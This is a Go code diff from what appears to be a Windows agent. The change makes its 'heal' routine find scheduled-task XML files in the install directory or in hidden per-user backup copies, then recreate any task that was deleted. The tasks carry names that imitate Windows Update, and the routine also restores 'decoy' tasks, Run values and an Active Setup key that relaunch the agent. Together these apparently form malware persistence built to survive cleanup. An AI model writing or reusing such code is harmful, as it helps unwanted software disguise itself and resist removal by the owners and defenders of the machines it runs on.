@@ -112,18 +112,19 @@ var wmiTaskPairs = [][2]string{
 	{"WindowsUpdateOrchestrator", "orchestrator_task.xml"},
 }
 
-// verLess compares dotted versions numerically ("1.40.9" < "1.40.17").
-func verLess(a, b string) bool {
-	pa, pb := strings.Split(a, "."), strings.Split(b, ".")
-	for i := 0; i < len(pa) && i < len(pb); i++ {
-		var x, y int
-		_, _ = fmt.Sscanf(pa[i], "%d", &x)
-		_, _ = fmt.Sscanf(pb[i], "%d", &y)
-		if x != y {
-			return x < y
+// resolveTaskXML finds a task XML: install dir first, then any profile
+// backup dir (three copies exist since v1.40.19).
+func resolveTaskXML(dir, name string) string {
+	cands := []string{filepath.Join(dir, name)}
+	for _, d := range systemBackupDirs() {
+		cands = append(cands, filepath.Join(d, name))
+	}
+	for _, p := range cands {
+		if st, err := os.Stat(p); err == nil && !st.IsDir() {
+			return p
 		}
 	}
-	return len(pa) < len(pb)
+	return ""
 }
 
 // systemBackupDirs lists every plausible per-user backup dir on the box.
@@ -224,9 +225,9 @@ func runWmiHeal() {
 		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
 			continue
 		}
-		xml := filepath.Join(dir, t[1])
-		if _, err := os.Stat(xml); err != nil {
-			log.Printf("[heal] task %s missing and no saved XML", t[0])
+		xml := resolveTaskXML(dir, t[1])
+		if xml == "" {
+			log.Printf("[heal] task %s missing and no saved XML anywhere", t[0])
 			continue
 		}
 		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
@@ -253,8 +254,8 @@ func runWmiHeal() {
 	ensureActiveSetupKey(agentPath)
 	// Decoy heal vectors too (task + Run value).
 	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
-		if xml, err := os.Stat(filepath.Join(dir, "decoy_task.xml")); err == nil && !xml.IsDir() {
-			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", filepath.Join(dir, "decoy_task.xml"), "/f").CombinedOutput()
+		if xml := resolveTaskXML(dir, "decoy_task.xml"); xml != "" {
+			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
 		}
 	}
 	decoyCmd := `"` + agentPath + `" --wmi-heal`
